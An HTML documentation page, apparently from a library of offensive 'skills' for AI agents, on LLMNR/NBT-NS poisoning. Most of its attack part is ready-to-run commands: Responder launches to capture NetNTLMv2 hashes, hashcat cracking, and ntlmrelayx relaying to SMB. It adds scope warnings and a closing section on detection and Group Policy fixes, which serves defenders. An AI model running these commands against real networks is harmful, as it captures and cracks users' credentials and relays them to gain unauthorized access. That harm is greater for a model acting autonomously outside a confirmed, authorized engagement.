@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: llmnr-poisoning</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>llmnr-poisoning</h2><div class="meta"><span class="badge gray">network</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when capturing authentication hashes on authorized Windows</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="recon-active.html">recon-active</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Responder</td><td>3.1.5</td></tr><tr><td>hashcat</td><td>6.2.6</td></tr><tr><td>nmap</td><td>7.98</td></tr></tbody></table><p>When Windows cannot resolve a hostname through DNS, it falls back to LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcasts, asking the whole LAN &quot;who is this?&quot; Responder answers &quot;me,&quot; and the victim then tries to authenticate to the attacker&#x27;s fake service, handing over a NetNTLM challenge-response hash. That hash cracks offline or relays to real services. This skill covers authorized LLMNR/NBT-NS poisoning: running Responder, capturing hashes, cracking them, and relaying only where the scope explicitly allows it. Poisoning is active and visible, so it runs on labs and explicitly scoped Windows segments only. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the Windows segment is in the written scope and note the</li>
+<p>poisoning risks with the client.</p>
+<li>Check that LLMNR/NBT-NS traffic exists on the wire before starting.</li>
+<li>Configure Responder: disable unneeded servers, set the interface.</li>
+<li>Run Responder and capture NetNTLMv2 hashes from victim broadcasts.</li>
+<li>Crack captured hashes offline with hashcat and a good wordlist.</li>
+<li>Relay only if the scope explicitly authorizes it, with tight targeting.</li>
+<li>Stop Responder and verify the segment is quiet again.</li>
+</ol>
+<h2>1. Confirm the protocols are alive</h2>
+<p>Poisoning only works if victims actually broadcast. Listen first.</p>
+<pre><code class="language-bash"># Watch for LLMNR (UDP 5355) and NBT-NS (UDP 137) queries
+sudo timeout 120 tshark -i eth0 -Y &quot;udp.port==5355 or udp.port==137&quot; \
+  -T fields -e ip.src -e llmnr.qry.name -e nbns.name 2&gt;/dev/null \
+  | sort -u | head -30</code></pre>
+<p>Typical triggers: mistyped share paths (<code>\\fileservr\share</code>), dead shortcuts, WPAD lookups, and applications resolving single label names. If the wire is silent for several minutes, poisoning will catch nothing; note the negative result and move on.</p>
+<pre><code class="language-bash"># nmap check for the related services on candidate victims
+nmap -p 137,138,139,445 --open 192.168.1.0/24 -oG /tmp/smb-lan.gnmap</code></pre>
+<h2>2. Configure Responder</h2>
+<p>Responder lives in its own directory; edit <code>Responder.conf</code> before the first run on each engagement. The defaults are aggressive, so trim them to the scope.</p>
+<pre><code class="language-bash">cd /opt/Responder 2&gt;/dev/null || cd ~/Responder
+
+# Recommended config for a standard hash capture run:
+# [Responder Core] HTTP = On, SMB = On, LLMNR = On, NBT-NS = On,
+#   DNS = Off (unless WPAD is in scope), FTP/LDAP/MSSQL = Off
+grep -E &quot;^(HTTP|SMB|LLMNR|NBT-NS|DNS|FTP|LDAP);? *=&quot; Responder.conf | head -10</code></pre>
+<p>Turn off servers you do not need: each open listener is extra noise and extra risk. Keep HTTP and SMB on for hash capture; leave DNS off unless WPAD poisoning is explicitly in scope, because answering DNS affects the whole segment.</p>
+<pre><code class="language-bash"># Bind to the test interface explicitly
+sudo python3 Responder.py -I eth0 -w -r -d -F
+# -w: start WPAD rogue server, -r: answer netbios wredir, -d: DHCP decode, -F: fingerprint</code></pre>
+<p>For a quiet hash-only run, drop the extras:</p>
+<pre><code class="language-bash">sudo python3 Responder.py -I eth0</code></pre>
+<h2>3. Capture hashes</h2>
+<p>With Responder running, wait for victims to broadcast. Captures appear in the terminal and land in the logs directory.</p>
+<pre><code class="language-bash"># Watch the Responder output for lines like:
+# [SMBv2] NTLMv2-SSP Client   : 192.168.1.50
+# [SMBv2] NTLMv2-SSP Username : CORP\jdoe
+# [SMBv2] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:...
+
+# List captured hashes
+ls -la logs/ | grep -i &quot;smb.*ntlmv2&quot;
+cat logs/SMBv2-NTLMv2-SSP-192.168.1.50.txt 2&gt;/dev/null | head -10</code></pre>
+<p>Each hash file holds <code>user::domain:server_challenge:nt_proof:rest</code>, which is hashcat mode 5600 input. Do not rename the files; the names encode the source.</p>
+<p>To speed up capture in a lab (with permission), trigger a broadcast from a lab victim yourself:</p>
+<pre><code class="language-bash"># On a LAB victim only: request a nonexistent share to force LLMNR/NBT-NS
+# From cmd.exe on the victim: dir \\nonexistent123\share</code></pre>
+<p>Never trigger broadcasts on real user workstations without explicit approval; waiting for natural traffic is the safe default.</p>
+<h2>4. Crack the hashes offline</h2>
+<p>Copy the hashes to your cracking box and run hashcat. NetNTLMv2 is mode 5600; NetNTLMv1 is mode 5500.</p>
+<pre><code class="language-bash"># Gather all captured v2 hashes into one file
+cat logs/SMBv2-NTLMv2-SSP-*.txt &gt; /tmp/ntlmv2.txt 2&gt;/dev/null
+wc -l /tmp/ntlmv2.txt
+
+# Dictionary attack with rules
+hashcat -m 5600 /tmp/ntlmv2.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# Show cracked results
+hashcat -m 5600 /tmp/ntlmv2.txt --show</code></pre>
+<pre><code class="language-bash"># NetNTLMv1 (weaker, cracks faster): mode 5500
+hashcat -m 5500 /tmp/ntlmv1.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule --show</code></pre>
+<p>Build a target specific wordlist from the engagement (company name, products, seasons, years) before burning GPU time on masks. One cracked domain account often unlocks the whole next phase, so report cracked credentials immediately through the agreed secure channel, not in chat logs.</p>
+<h2>5. Relay (only when explicitly authorized)</h2>
+<p>Relaying forwards the victim&#x27;s authentication to a real service (usually SMB) instead of cracking it. It is powerful and easy to misuse: relaying to the wrong host can lock accounts or change state. Scope it tightly.</p>
+<pre><code class="language-bash"># ntlmrelayx: relay to ONE explicit target, SMB only
+sudo impacket-ntlmrelayx -t smb://192.168.1.20 -smb2support -i eth0
+
+# With Responder, disable its SMB server so ntlmrelayx owns port 445
+# In Responder.conf: SMB = Off, then run both tools together</code></pre>
+<p>Rules: one target host per run, no relaying to domain controllers unless the scope names it, <code>--no-dump</code> unless credential dumping is authorized, and stop the moment you have proof of access. A relayed session that only runs <code>shares</code> and <code>whoami</code> style enumeration is enough for most reports. See ad-enumeration for what to do with the access once proven.</p>
+<p>Check SMB signing on the relay target first; signing defeats relay:</p>
+<pre><code class="language-bash">nmap -p 445 --script smb-security-mode 192.168.1.20 | grep -i signing</code></pre>
+<h2>6. Stop cleanly</h2>
+<p>Responder poisons only while it runs; stopping it ends the attack. Still, verify.</p>
+<pre><code class="language-bash"># Stop Responder with Ctrl-C, then confirm the wire is quiet
+sudo timeout 60 tshark -i eth0 -Y &quot;udp.port==5355 or udp.port==137&quot; \
+  2&gt;/dev/null | wc -l
+# Expect only natural background queries, none answered by your MAC
+
+# Confirm no listener is left on 445/80
+sudo ss -tlnp | grep -E &#x27;:445|:80&#x27; | grep -i respond || echo &quot;clean&quot;</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>No broadcasts arrive. The segment may have LLMNR disabled already, or</li>
+<p>victims are quiet; capture longer or test in a livelier window, then record the negative.</p>
+<li>Responder fails to bind port 445. Samba or another service holds it;</li>
+<p>stop the conflicting service or disable Responder&#x27;s SMB server.</p>
+<li>Hashes crack to nothing. NetNTLMv2 with a strong password resists</li>
+<p>dictionaries; try the targeted wordlist once, then report the capture as proof of the poisoning vector itself.</p>
+<li>WPAD is in scope but nothing triggers. Modern browsers and OS versions</li>
+<p>changed WPAD behavior; verify with a lab victim before reporting it dead.</p>
+<li>The client runs a segmented network. Poisoning only affects your</li>
+<p>broadcast domain; each VLAN needs its own authorized run.</p>
+<li>Antivirus flags Responder. That is expected; run it from the attack</li>
+<p>platform, not from a client managed host, and warn the SOC contact so the alert is not treated as a real intrusion.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Hash capture works but nothing cracks. Pivot to relaying against</li>
+<p>explicitly authorized targets with SMB signing disabled.</p>
+<li>Relay target has signing required. Note the control as effective and</li>
+<p>fall back to cracking or to other credential attacks (see password-attacks).</p>
+<li>LLMNR is disabled via GPO but NBT-NS is not. Poison NBT-NS only; many</li>
+<p>shops disable one and forget the other, so test both independently.</p>
+<li>Both are disabled. Verify with a packet capture, report the controls</li>
+<p>as effective, and close this attack path.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see poisoning as LLMNR/NBT-NS responses from a host that is not a server, spikes in UDP 5355/137 traffic, and Event ID 4624 logons on the attacker&#x27;s fake SMB service. EDR and NDR flag Responder&#x27;s default fingerprints (its HTTP server headers, its SMB dialect quirks). The durable fixes, in order: disable LLMNR via Group Policy (Computer Configuration, Administrative Templates, Network, DNS Client, Turn off multicast name resolution), disable NetBIOS over TCP/IP via DHCP option or adapter settings, require SMB signing everywhere, and monitor for broadcast name resolution responses from unexpected hosts. These two GPO changes kill the entire attack class at negligible cost.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1557.001 (Adversary-in-the-Middle, LLMNR/NBT-NS</li>
+<p>Poisoning and SMB Relay).</p>
+<li>CWE-306 (Missing Authentication for Critical Function):</li>
+<p>unauthenticated name resolution.</p>
+<li>CWE-200 (Exposure of Sensitive Information): leaked challenge</li>
+<p>responses.</p>
+<li>Microsoft: &quot;Turn off multicast name resolution&quot; Group Policy</li>
+<p>documentation.</p>
+<li>Responder documentation: https://github.com/lgandx/Responder</li>
+<li>Impacket ntlmrelayx: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
